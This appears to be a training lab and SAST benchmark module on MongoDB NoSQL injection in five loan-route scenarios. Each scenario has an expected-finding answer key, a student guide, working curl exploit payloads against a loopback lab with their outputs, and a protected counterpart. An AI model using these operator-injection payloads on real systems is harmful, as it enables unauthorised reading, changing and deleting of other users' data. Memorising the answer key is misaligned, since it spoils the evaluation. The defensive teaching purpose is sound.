# Module: Workshop loans (second MongoDB batch)

The loan routes of [the workshop batch](workshop.md) (MONGO-039 to MONGO-043). Techniques demonstrated: request filters inside `bulkWrite`, a raw value choosing which row a delete removes, `Object.assign` merging the caller after the fixed owner, all three `$lookup` settings from the request, and request-written clauses inside a top-level `$or`.

The routes use the native `mongodb` driver against [mongodb-memory-server](https://www.npmjs.com/package/mongodb-memory-server) (MongoDB 8.2.6, loopback, synthetic data). The full answer key is in [workshop.md](workshop.md). Scope: injection only; the missing ownership checks are out of scope for both labels and are the same on both sides of each pair.

## Contents

| Scenario | Agent ref | Student guide | Exploit lab | Vuln vs protected | Tests |
| --- | --- | --- | --- | --- | --- |
| [MONGO-039 · Request filters in a bulkWrite](#mongo-039) | [expected finding](#mongo-039-agent) | [guide](#mongo-039-student) | [Burp · Postman · curl](#mongo-039-exploit) | [comparison](#mongo-039-safe) | [tests](#mongo-039-tests) |
| [MONGO-040 · A loan number taken as it arrives](#mongo-040) | [expected finding](#mongo-040-agent) | [guide](#mongo-040-student) | [Burp · Postman · curl](#mongo-040-exploit) | [comparison](#mongo-040-safe) | [tests](#mongo-040-tests) |
| [MONGO-041 · A spread after the fixed owner](#mongo-041) | [expected finding](#mongo-041-agent) | [guide](#mongo-041-student) | [Burp · Postman · curl](#mongo-041-exploit) | [comparison](#mongo-041-safe) | [tests](#mongo-041-tests) |
| [MONGO-042 · Request data in $lookup](#mongo-042) | [expected finding](#mongo-042-agent) | [guide](#mongo-042-student) | [Burp · Postman · curl](#mongo-042-exploit) | [comparison](#mongo-042-safe) | [tests](#mongo-042-tests) |
| [MONGO-043 · Request clauses in a top-level $or](#mongo-043) | [expected finding](#mongo-043-agent) | [guide](#mongo-043-student) | [Burp · Postman · curl](#mongo-043-exploit) | [comparison](#mongo-043-safe) | [tests](#mongo-043-tests) |

## Safe cases and why they are tricky

| Safe source | Control for | Why it is safe | Wrong reasoning it catches |
| --- | --- | --- | --- |
| `pages/api/workshop/loans/bundle.js` | MONGO-039 | The filter names the fixed borrower, the number is an element of `$in`, and the state is a fixed two-way choice. | Reporting `bulkWrite` because a request array is near the filter. |
| `pages/api/workshop/loans/withdraw.js` | MONGO-040 | `parseInt` leaves an integer or `NaN`, and the borrower is fixed; an object becomes `NaN` and matches nothing. | Reporting a delete because a request value names the row. |
| `pages/api/workshop/loans/give-back.js` | MONGO-041 | The number is coerced and the fixed borrower is assigned after the body, so the body cannot widen the filter. | Reporting every `Object.assign` merge without reading the order. |
| `pages/api/workshop/loans/linked.js` | MONGO-042 | The lookup document is one of two constants; the request only chooses between them. | Reporting a `$lookup` because the request chooses a name. |
| `pages/api/workshop/loans/ours.js` | MONGO-043 | Each request entry is rebuilt as a fixed shape with a coerced number and the fixed borrower. | Reporting every spread into `$or` without reading what is spread. |

## Vulnerable cases that look safe

| Vulnerable source | What looks like a control | Why it is not |
| --- | --- | --- |
| `pages/api/workshop/loans/batch.js` (MONGO-039) | A fixed `$set` update | The fixed update says what changes, but the request object says *which rows* — and it is the update filter, taken as it arrives. |
| `pages/api/workshop/loans/cancel.js` (MONGO-040) | A required `number` field | Only presence is checked; an operator object selects the row the delete removes. |
| `pages/api/workshop/loans/hand-back.js` (MONGO-041) | A fixed borrower in the merge | `Object.assign({borrower:'alice'}, body)` puts the fixed owner *first*, so the body overwrites it. |
| `pages/api/workshop/loans/joined.js` (MONGO-042) | A `$match` that pins `borrower: 'alice'` before the join | The match limits the loans, but the `$lookup` then joins whatever collection and fields the caller names — with no pipeline, so whole documents arrive. |
| `pages/api/workshop/loans/mine.js` (MONGO-043) | A fixed first clause in the `$or` | The request array is spread into the same `$or`, so its clauses are alternatives, not additions. |

---

<a id="mongo-039"></a>
## MONGO-039 · Request filters in a bulkWrite

<a id="mongo-039-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/loans/batch.js` |
| Safe control | `pages/api/workshop/loans/bundle.js` |
| Route | `POST /api/workshop/loans/batch` vs `/api/workshop/loans/bundle` |
| Flow | body `items[].where` → `bulkWrite` `updateOne` filters |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-039-student) · [Exploit lab](#mongo-039-exploit) · [Vuln vs protected](#mongo-039-safe) · [Tests](#mongo-039-tests)

<a id="mongo-039-student"></a>
### Student guide

A bulk write is a list of operations, and each operation has its own filter. The fixed `$set: {state: 'in'}` in this route controls *what* changes, which reads like a control — but `item.where` controls *which rows*, and it is the caller's object, taken as it arrives. One crafted `where` — a `$ne` that excludes only the caller's own loan — marks another person's loan as returned. The twin destructures named fields, names the fixed borrower in the filter, and reduces the number to an element of `$in`.

<a id="mongo-039-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type: application/json' \
  -d '{"items":[{"where":{"number":{"$ne":101}}}]}'
# {"changed":1}

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/bundle -H 'Content-Type: application/json' \
  -d '{"items":[{"where":{"number":{"$ne":101}}}]}'
# {"changed":0} — the where key is never read

# Read the effect back: the caller's own loan is untouched, so the row that
# changed is loan 202, the admin loan.
curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type: application/json' \
  -d '{"items":[{"where":{"number":101}}]}'
# {"changed":1} — loan 101 was still out, so the attack changed 202
```

The control never reads `where`, so that input cannot reach its filter. This one is a well-formed request for the admin loan, in the keys it does read:

```bash
curl -s -X POST http://127.0.0.1:3000/api/lab/reset
# {"reset":true}

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/batch -H 'Content-Type: application/json' \
  -d '{"items":[{"where":{"number":202},"number":202,"state":"in"}]}'
# {"changed":1}

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/bundle -H 'Content-Type: application/json' \
  -d '{"items":[{"where":{"number":202},"number":202,"state":"in"}]}'
# {"changed":0} — the fixed borrower keeps loan 202 out of reach
```

**Observation that proves exploitation:** the attack reports `changed: 1` for a filter that cannot match the caller's own loan, and the read-back shows loan 101 untouched — the changed row is 202, the admin loan, which the ordinary input can never name.

<a id="mongo-039-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/loans/batch.js` | vulnerable | Each item's `where` object is the update filter as it arrives; the fixed `$set` does not constrain the filter. |
| `pages/api/workshop/loans/bundle.js` | protected | The filter names the fixed borrower, the number is an element of `$in`, and the state is a fixed two-way choice. |

The control is scoped to this flaw. The first input is inert because the control never reads `where`; the second reaches its filter, and the fixed borrower is what keeps it inert.

<a id="mongo-039-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: each input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-040"></a>
## MONGO-040 · A loan number taken as it arrives

<a id="mongo-040-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/loans/cancel.js` |
| Safe control | `pages/api/workshop/loans/withdraw.js` |
| Route | `POST /api/workshop/loans/cancel` vs `/api/workshop/loans/withdraw` |
| Flow | body `number` → `findOneAndDelete` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-040-student) · [Exploit lab](#mongo-040-exploit) · [Vuln vs protected](#mongo-040-safe) · [Tests](#mongo-040-tests)

<a id="mongo-040-student"></a>
### Student guide

`findOneAndDelete` removes whatever the filter matches first. This route checks only that `number` is *present*, then uses it as the filter — so `{"$ne":101}` means "delete the first loan whose number is not 101", which is another person's loan. The twin coerces with `Number.parseInt` and fixes the borrower: an object becomes `NaN` and matches nothing.

<a id="mongo-040-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/cancel -H 'Content-Type: application/json' \
  -d '{"number":{"$ne":101}}'
# {"gone":202} — admin's loan was removed

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/withdraw -H 'Content-Type: application/json' \
  -d '{"number":{"$ne":101}}'
# {"gone":null}
```

**Observation that proves exploitation:** `gone: 202` — a loan that the ordinary input (its own number) can never name is gone.

<a id="mongo-040-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/loans/cancel.js` | vulnerable | `number` is not coerced; an operator object selects which loan is deleted. |
| `pages/api/workshop/loans/withdraw.js` | protected | `parseInt` leaves an integer or `NaN`, and the borrower is fixed. |

The control is scoped to this flaw.

<a id="mongo-040-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-041"></a>
## MONGO-041 · A spread after the fixed owner

<a id="mongo-041-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/loans/hand-back.js` |
| Safe control | `pages/api/workshop/loans/give-back.js` |
| Route | `POST /api/workshop/loans/hand-back` vs `/api/workshop/loans/give-back` |
| Flow | body `loan` → `Object.assign` after the fixed borrower → `findOneAndUpdate` filter |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-041-student) · [Exploit lab](#mongo-041-exploit) · [Vuln vs protected](#mongo-041-safe) · [Tests](#mongo-041-tests)

<a id="mongo-041-student"></a>
### Student guide

`Object.assign(target, ...sources)` copies each source onto the target in order — later sources overwrite earlier keys. This route puts the fixed borrower *first* and the request object *second*, so the caller replaces the owner and names any row to update. The twin reverses both ideas: it reads one field, coerces it, and assigns the fixed borrower last.

<a id="mongo-041-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/hand-back -H 'Content-Type: application/json' \
  -d '{"loan":{"number":202,"borrower":"admin"}}'
# {"loan":{"number":202,"state":"in",...}} — admin's loan is changed

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/give-back -H 'Content-Type: application/json' \
  -d '{"loan":{"number":202,"borrower":"admin"}}'
# {"loan":null}
```

**Observation that proves exploitation:** the response holds the admin loan with `state: 'in'` — a row the fixed owner was meant to keep out of reach.

<a id="mongo-041-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/loans/hand-back.js` | vulnerable | The body is merged after `{borrower:'alice'}`, so it can replace the owner and pick another row to update. |
| `pages/api/workshop/loans/give-back.js` | protected | The number is coerced (`NaN` for objects) and the fixed borrower is assigned after the body. |

The control is scoped to this flaw.

<a id="mongo-041-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-042"></a>
## MONGO-042 · Request data in $lookup

<a id="mongo-042-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/loans/joined.js` |
| Safe control | `pages/api/workshop/loans/linked.js` |
| Route | `POST /api/workshop/loans/joined` vs `/api/workshop/loans/linked` |
| Flow | body `from`/`mine`/`theirs` → `$lookup` collection and field names |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-042-student) · [Exploit lab](#mongo-042-exploit) · [Vuln vs protected](#mongo-042-safe) · [Tests](#mongo-042-tests)

<a id="mongo-042-student"></a>
### Student guide

A `$match` that pins `borrower: 'alice'` limits which *loans* are read, and it is easy to read it as "the join is scoped too". It is not: `from` names the joined collection, `localField`/`foreignField` name the join keys, and all three come from the request. Joining `people` on `borrower`/`login` embeds the complete people documents — passcode, reset code and one-time code included, because there is no pipeline projection. The twin chooses between two constant lookup documents by own-key lookup.

<a id="mongo-042-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/joined -H 'Content-Type: application/json' \
  -d '{"from":"people","mine":"borrower","theirs":"login"}'
# rows carry complete people documents in "extra", passcode included

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/linked -H 'Content-Type: application/json' \
  -d '{"from":"people","mine":"borrower","theirs":"login"}'
# status 400 — those keys are not read
```

The control reads `link` instead of those three keys, so that input stops at the 400. With `link` added, the same input reaches its own lookup — it joins `people` too:

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/joined -H 'Content-Type: application/json' \
  -d '{"from":"people","mine":"borrower","theirs":"login","link":"person"}'
# rows carry complete people documents in "extra", passcode included

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/linked -H 'Content-Type: application/json' \
  -d '{"from":"people","mine":"borrower","theirs":"login","link":"person"}'
# {"rows":[{"number":101,"extra":[{"email":"alice@lab.test"}]}]}
```

**Observation that proves exploitation:** the joined rows hold a passcode (`alice-lab-only`) in `extra`, a field no normal output of this API returns. The control can be made to join the same collection, and still returns only the email.

<a id="mongo-042-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/loans/joined.js` | vulnerable | All three `$lookup` settings come from the request, and with no pipeline the joined documents arrive whole. |
| `pages/api/workshop/loans/linked.js` | protected | The lookup document is one of two constants; the request only chooses between them. |

The control is scoped to this flaw. The constants also fix the projection, which is why the `person` link joins `people` and returns no passcode.

<a id="mongo-042-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: each input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.

---

<a id="mongo-043"></a>
## MONGO-043 · Request clauses in a top-level $or

<a id="mongo-043-agent"></a>
### Agent reference — expected finding

| Field | Value |
| --- | --- |
| Source | `pages/api/workshop/loans/mine.js` |
| Safe control | `pages/api/workshop/loans/ours.js` |
| Route | `POST /api/workshop/loans/mine` vs `/api/workshop/loans/ours` |
| Flow | body `also[]` → spread into a top-level `$or` → `find` |
| Tests | `tests/unit/workshop-scenarios.test.mjs`, `tests/api/lab.api.test.mjs` |

**Expected finding:** SAST reports CWE-943 in the vulnerable source and nothing in the safe source.

[Student guide](#mongo-043-student) · [Exploit lab](#mongo-043-exploit) · [Vuln vs protected](#mongo-043-safe) · [Tests](#mongo-043-tests)

<a id="mongo-043-student"></a>
### Student guide

`{$or: [fixed, ...also]}` reads as "my clause, plus some extras" — but every element of `$or` is an *alternative*, so one crafted element (`{"borrower":{"$ne":"alice"}}`) widens the whole query to rows that are not the caller's. The twin keeps the same spread but rebuilds each entry first: `{number: Number(...), borrower: 'alice'}` — a fixed shape with a coerced number, so an operator object cannot survive the mapping.

<a id="mongo-043-exploit"></a>
### Exploit lab

Run `curl -s -X POST http://127.0.0.1:3000/api/lab/reset` first. Send the same input to both routes.

**Burp Suite**: send the requests below to Repeater (Copy as curl command, then paste) and compare the response bodies.

**Postman**: import each curl command below and compare the response bodies.

**curl**

```bash
curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/mine -H 'Content-Type: application/json' \
  -d '{"also":[{"borrower":{"$ne":"alice"}}]}'
# {"loans":[...101...,...202...]} — admin's loan is listed

curl -s -X POST http://127.0.0.1:3000/api/workshop/loans/ours -H 'Content-Type: application/json' \
  -d '{"also":[{"borrower":{"$ne":"alice"}}]}'
# {"loans":[...101 only...]}
```

**Observation that proves exploitation:** the response lists loan `202` (the admin loan) alongside the caller's.

<a id="mongo-043-safe"></a>
### Vulnerable vs protected — and why

| Route | Side | Why |
| --- | --- | --- |
| `pages/api/workshop/loans/mine.js` | vulnerable | The fixed first `$or` clause is joined with request-written clauses; an operator object in one of them widens the query to rows that are not the caller's. |
| `pages/api/workshop/loans/ours.js` | protected | Each request entry is rebuilt as a fixed shape with a coerced number and the fixed borrower. |

The control is scoped to this flaw.

<a id="mongo-043-tests"></a>
### Automated tests

- `tests/unit/workshop-scenarios.test.mjs`: the input succeeds on the vulnerable route and has no effect on the safe route; both accept ordinary input.
- `tests/api/lab.api.test.mjs`: the same over HTTP against the production build.
